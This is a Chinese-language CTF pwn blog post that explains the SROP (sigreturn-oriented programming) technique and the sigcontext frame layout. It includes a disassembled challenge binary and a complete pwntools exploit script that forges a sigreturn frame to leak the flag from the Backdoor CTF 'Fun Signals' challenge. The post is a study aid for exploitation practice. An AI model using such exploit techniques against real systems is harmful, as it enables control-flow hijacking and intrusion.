---
title: "Special topic: Tricky tricks summary for Pwn"
pubDate: "2025-02-01 16:01"
modDate: "2025-02-01 23:19"
categories:
  - "Pwn"
  - "Tricks"
description: "This special topic is about some tricky tricks i've learned so far in Pwn field. Keep updating as the mood strikes."
slug: "pwn-notes"
pin: true
---

## Table of contents

## 前言

> 写这篇博客的起因应该是为了一个即将到来的比赛，而我还有好多 high level tricks 没学过，万一在比赛上碰到了再临场学肯定是很浪费时间的，而且为不同 tricks 都单独写一篇博客显然不是很好，我一般喜欢围绕一个大的系列来写博客，~_这样才能显得不那么水，是吧？_~
>
> 好吧，上面说的只是一个最次要的原因罢了。这就不得不提到我 23 年刚推开 Pwn 之门的一条缝后的一个小梦想了……众所不周知 Pwn 方面优秀的系统教程应该可以说是少得可怜，相当于没有。所以我当时的这个小梦想就是写一份有关 Pwn 的详细教程，让有志之士从入门到入坟，少走弯路，不那么痛苦。~_伟大吗？_~
>
> 唉，你还能在[我的原博客](https://tailwind-nextjs-starter-blog-ruby.vercel.app/)看到我以前写的系列文章。现在看看写的什么 trash，叫人从哪开始看都不知道，而且当时只是边学边翻译了 [ir0nstone 的笔记](https://ir0nstone.gitbook.io/)，说白了就是搬运，没多少自己的成分在里面……所以这第二次做同样的事嘛，我一定会比第一次做的好 $\infty$ 倍。~_有关这方面，我的字典里面没有，也不允许出现「不行」这个词。_~
>
> 其实我本来想用 GitBook 或者建一个类似 wiki 的平台来写这个的，不过最终还是决定放在这里，为啥？我不道啊……
>
> 正如我在 Description 中写的：_Keep updating as the mood strikes._ 不论你现在看到的这篇文章有多简陋……给我点时间，未来它一定会成为一本不错的手册！
>
> 莫欺少年穷，咱顶峰相见。
>
> <p style="text-align: right;">——以上，书于 02/01/2025</p>

## ROP 那些事

### ret2csu

我在 [ROP Emporium - Challenge 8](/posts/rop-emporium-series/#challenge-8) 写的已经很详细了，最近比赛赶时间，等我打完之后再来慢慢完善吧，只能暂且劳请各位老爷们先凑合着看了<s>_（如果有人看的话。/真叫人伤心）_</s>。

### SROP

#### Principle

Okay, the first thing, what is `SROP`?

`SROP (Signal Return Oriented Programming)`，思想是利用操作系统信号处理机制的漏洞来实现对程序控制流的劫持。

`sigreturn` 是一个特殊的 `syscall`，负责在信号处理函数执行完后根据栈上保存的 `sigcontext` 的内容进行清理工作（还原到程序在进行信号处理之前的运行状态，就好像什么都没有发生一样，以便于接着运行因中断而暂停的程序）。它帮助程序**从 Signal Handler（泛指信号处理函数）中返回**，并通过清理信号处理函数使用的栈帧来恢复程序的运行状态。

我们知道，在传统的 ROP 中，攻击者可以利用程序中已存在的 gadgets 构造一个指令序列来执行恶意代码。SROP 则在此基础上利用了信号处理机制的漏洞，在信号处理函数的上下文切换中执行攻击，实现一次控制所有寄存器的效果。

攻击步骤大致如下：

- 攻击者通过在栈上伪造 `sigcontext` 结构来控制所有寄存器的值，设置后续 ROP Chain 中恶意代码要用到的参数。
- 想办法令目标程序执行 `sigreturn`，进行信号处理（信号是操作系统发送给程序的中断信息，通常用于指示发生了一些必须立即处理的异常情况）。
- 调用 `sigreturn` 后，系统会暂停当前程序的执行，通过 Signal Handler 处理信号，处理完后根据 `sigcontext` 的内容恢复运行环境。
- 这时候我们已经达成了设置参数的目的，返回到 ROP Chain 继续执行恶意代码。

正常情况下当遇到需要处理信号的时候，`kernel` 会在栈上创建一个新的栈帧，并生成一个 `sigcontext` 结构保存在新的栈帧中，`sigcontext` 本质上就是一个对执行信号处理函数前的运行环境的快照，以便之后恢复到执行信号处理函数之前的环境接着运行；接着切换上下文到 Signal Handler 中进行信号处理工作；当信号不再被阻塞时，`sigreturn` 会根据栈中保存的 `sigcontext` 弹出所有寄存器的值，有效地将寄存器还原为执行信号处理之前的状态。

那对于我们主动诱导程序去执行 `sigreturn` 的这种非正常情况，栈上肯定是不会有 `kernel` 生成的 `sigcontext` 结构的，我就问你你能不能在栈上伪造一个 `sigcontext` 出来？嘿嘿。

敏锐的你现在是不是想跳起来惊呼，这是不是好比核武器？没错，通过伪造 `sigcontext` 你可以一次控制所有寄存器的值，SO FUCKING POWERFUL!

不幸的是这也是它的缺点所在……如果你不能泄漏栈值，就无法为 RSP 等寄存器设置一个有效的值，这或许是个棘手的问题。但无论如何，这都是一个强大的 trick, 尤其是在可用的 gadgets 有限的情况下。

用于恢复状态的 `sigcontext` 的结构如下 (基于 `x86_64`)：

```plaintext wrap=false showLineNumbers=false
+--------------------+--------------------+
| rt_sigeturn()      | uc_flags           |
+--------------------+--------------------+
| &uc                | uc_stack.ss_sp     |
+--------------------+--------------------+
| uc_stack.ss_flags  | uc.stack.ss_size   |
+--------------------+--------------------+
| r8                 | r9                 |
+--------------------+--------------------+
| r10                | r11                |
+--------------------+--------------------+
| r12                | r13                |
+--------------------+--------------------+
| r14                | r15                |
+--------------------+--------------------+
| rdi                | rsi                |
+--------------------+--------------------+
| rbp                | rbx                |
+--------------------+--------------------+
| rdx                | rax                |
+--------------------+--------------------+
| rcx                | rsp                |
+--------------------+--------------------+
| rip                | eflags             |
+--------------------+--------------------+
| cs / gs / fs       | err                |
+--------------------+--------------------+
| trapno             | oldmask (unused)   |
+--------------------+--------------------+
| cr2 (segfault addr)| &fpstate           |
+--------------------+--------------------+
| __reserved         | sigmask            |
+--------------------+--------------------+
```

有关 SROP 的演示，这里还有一个[视频](https://youtu.be/ADULSwnQs-s?si=j1WVxYk2FPR21uZQ)讲的也很好，强推给你！

#### Example

好了，知道了这些基础概念后，下面就通过 Backdoor CTF 2017 的 [Fun Signals](https://github.com/guyinatuxedo/nightmare/blob/master/modules/16-srop/backdoor_funsignals/funsignals_player_bin) 这道题来实战一下吧～

```asm wrap=false showLineNumbers=false ins={35}
.shellcode:0000000010000000                     .686p
.shellcode:0000000010000000                     .mmx
.shellcode:0000000010000000                     .model flat
.shellcode:0000000010000000     .intel_syntax noprefix
.shellcode:0000000010000000
.shellcode:0000000010000000     ; ===========================================================================
.shellcode:0000000010000000
.shellcode:0000000010000000     ; Segment type: Pure code
.shellcode:0000000010000000     ; Segment permissions: Read/Write/Execute
.shellcode:0000000010000000     _shellcode      segment byte public 'CODE' use64
.shellcode:0000000010000000                     assume cs:_shellcode
.shellcode:0000000010000000                     ;org 10000000h
.shellcode:0000000010000000                     assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing
.shellcode:0000000010000000
.shellcode:0000000010000000                     public _start
.shellcode:0000000010000000     _start:                                 ; Alternative name is '_start'
.shellcode:0000000010000000                     xor     eax, eax        ; __start
.shellcode:0000000010000002                     xor     edi, edi        ; Logical Exclusive OR
.shellcode:0000000010000004                     xor     edx, edx        ; Logical Exclusive OR
.shellcode:0000000010000006                     mov     dh, 4
.shellcode:0000000010000008                     mov     rsi, rsp
.shellcode:000000001000000B                     syscall                 ; LINUX - sys_read
.shellcode:000000001000000D                     xor     edi, edi        ; Logical Exclusive OR
.shellcode:000000001000000F                     push    0Fh
.shellcode:0000000010000011                     pop     rax
.shellcode:0000000010000012                     syscall                 ; LINUX - sys_rt_sigreturn
.shellcode:0000000010000014                     int     3               ; Trap to Debugger
.shellcode:0000000010000015
.shellcode:0000000010000015     syscall:                                ; LINUX - sys_rt_sigreturn
.shellcode:0000000010000015                     syscall
.shellcode:0000000010000017                     xor     rdi, rdi        ; Logical Exclusive OR
.shellcode:000000001000001A                     mov     rax, 3Ch ; '<'
.shellcode:0000000010000021                     syscall                 ; LINUX - sys_exit
.shellcode:0000000010000021     ; ---------------------------------------------------------------------------
.shellcode:0000000010000023     flag            db 'fake_flag_here_as_original_is_at_server',0
.shellcode:0000000010000023     _shellcode      ends
.shellcode:0000000010000023
```

可以看到这是一个非常简单的程序，单纯的就是为了考 SROP，以至于出题人都直接手撸汇编了。

注意到 flag 被写死在 `0x10000023` 这个位置了，而且程序也没开 ASLR 什么的，所以我们的目标就是输出这个地址处的内容。

简单分析一下这个程序，我们知道它在第一个 `syscall` 处调用了 `read`，从 `stdin` 读取了 `0x400` bytes 到栈上。紧接着第二个 `syscall` 直接帮我们调用了 `rt_sigreturn`，那就不用我们自己动手了，我们只要伪造并发送 `sigcontext` 栈帧即可。思路是伪造一个 `SYS_write` 的调用，将 flag 输出到 `stdout`。

#### Exploit

```python
#!/usr/bin/python3

from contextlib import contextmanager

from pwn import (
    ELF,
    ROP,
    SigreturnFrame,
    constants,
    context,
    gdb,
    log,
    process,
    remote,
)

context(log_level="debug", terminal="kitty")

FILE = "./funsignals_player_bin"
HOST, PORT = "localhost", 1337

gdbscript = """
b *_start+11
c
"""


@contextmanager
def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    target = None

    try:
        if local:
            global elf

            elf = ELF(FILE)
            context.binary = elf

            target = (
                gdb.debug(
                    [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
                )
                if debug
                else process([elf.path] + (argv or []), env=envp)
            )
        else:
            target = remote(HOST, PORT)
        yield target
    finally:
        if target:
            target.close()


def construct_payload():
    flag_address = 0x10000023

    rop = ROP(elf)

    syscall = rop.syscall.address

    frame = SigreturnFrame()

    frame.rdi = 0x1
    frame.rsi = flag_address
    frame.rdx = 0x1337
    frame.rax = constants.SYS_write
    frame.rip = syscall

    return bytes(frame)


def attack(target):
    try:
        payload = construct_payload()

        target.send(payload)

        response = target.recvall(timeout=3)

        if b"flag" in response:
            log.success(response[:0x27].decode("ascii"))

            return True
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        with launch(debug=False) as target:
            if attack(target):
                log.success("Attack completed successfully.")
            else:
                log.failure("Attack did not yield a flag.")
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

#### Summary

总结：有的时候你的 ROP Chain 可能会缺少一些必要的 gadgets，导致无法设定某些后续攻击代码需要用到的参数，这时候就可以考虑使用 SROP 来控制寄存器。当然，使用 SROP 也是有条件的，比如你起码得有 `syscall` 这个 gadget，并且能控制 `rax` 的值为 `sigreturn` 的系统调用号。

> [!TIP]
> 要知道 `rax` 是一个特殊的寄存器，通常用于保存函数的返回值。所以当我说控制 `rax` 的值时，你不一定非得通过某些 gadgets 来实现这一点，有时候程序本身就可以为你设置好它，比如 `read` 函数会返回读到的字节数。
